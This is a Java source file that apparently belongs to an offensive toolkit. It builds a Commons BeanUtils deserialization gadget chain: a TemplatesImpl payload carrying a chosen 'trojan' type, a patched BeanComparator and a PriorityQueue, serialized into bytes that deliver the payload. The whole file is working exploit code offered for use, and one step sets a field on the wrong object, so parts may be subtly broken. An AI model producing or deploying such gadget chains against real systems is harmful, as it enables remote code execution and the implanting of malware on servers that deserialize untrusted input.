package core.gadgets;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.JavassistClassLoader;
import core.gadgets.utils.Reflections;
import core.utils.Util;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsBeanutilsString_192s {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, trojanType);
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass beanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        try {
            CtField ctSUID = beanComparator.getDeclaredField("serialVersionUID");
            beanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        beanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", beanComparator));
        // mock method name until armed
        final Comparator comparator = (Comparator)beanComparator.toClass(new JavassistClassLoader()).newInstance();
        beanComparator.defrost();

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)comparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { templates, templates });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object val = getObject(type, trojanType);
        return Util.serialize(val);
    }
}



